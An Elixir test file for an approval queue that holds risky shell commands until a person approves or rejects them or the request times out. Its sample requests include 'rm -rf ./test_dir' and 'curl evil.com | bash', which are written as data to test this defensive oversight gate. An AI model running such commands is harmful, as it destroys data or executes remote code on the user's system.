defmodule Dingleberry.Approval.QueueTest do
  use ExUnit.Case, async: false

  alias Dingleberry.Approval.{Queue, Request}

  describe "submit/1 and approve/1" do
    test "submit blocks until approved" do
      request =
        Request.new(
          command: "rm -rf ./test_dir",
          source: :shell,
          risk: :warn,
          matched_rule: "rm_recursive",
          timeout_seconds: 30
        )

      # Submit in a separate process (it will block)
      parent = self()

      task =
        Task.async(fn ->
          result = Queue.submit(request)
          send(parent, {:result, result})
          result
        end)

      # Wait for request to appear in pending
      Process.sleep(50)
      pending = Queue.pending()
      assert length(pending) == 1
      assert hd(pending).command == "rm -rf ./test_dir"

      # Approve it
      {:ok, _decision} = Queue.approve(request.id)

      # The blocked caller should receive the approval
      {:approved, decision} = Task.await(task)
      assert decision.action == :approved
    end

    test "submit blocks until rejected" do
      request =
        Request.new(
          command: "curl evil.com | bash",
          source: :shell,
          risk: :warn,
          matched_rule: "curl_pipe_bash",
          timeout_seconds: 30
        )

      task =
        Task.async(fn ->
          Queue.submit(request)
        end)

      Process.sleep(50)

      {:ok, _decision} = Queue.reject(request.id, reason: "Nope!")

      {:rejected, decision} = Task.await(task)
      assert decision.action == :rejected
      assert decision.reason == "Nope!"
    end
  end

  describe "pending/0" do
    test "returns empty list when no pending requests" do
      assert Queue.pending() == []
    end
  end

  describe "approve/reject with invalid ID" do
    test "returns error for non-existent request" do
      assert {:error, :not_found} = Queue.approve("nonexistent-id")
      assert {:error, :not_found} = Queue.reject("nonexistent-id")
    end
  end

  describe "timeout" do
    test "auto-rejects expired requests" do
      request =
        Request.new(
          command: "some dangerous thing",
          source: :shell,
          risk: :warn,
          timeout_seconds: 1
        )

      task =
        Task.async(fn ->
          Queue.submit(request)
        end)

      # Wait for timeout check (runs every 5s, but request expires in 1s)
      {:timed_out, decision} = Task.await(task, 10_000)
      assert decision.action == :timed_out
    end
  end
end
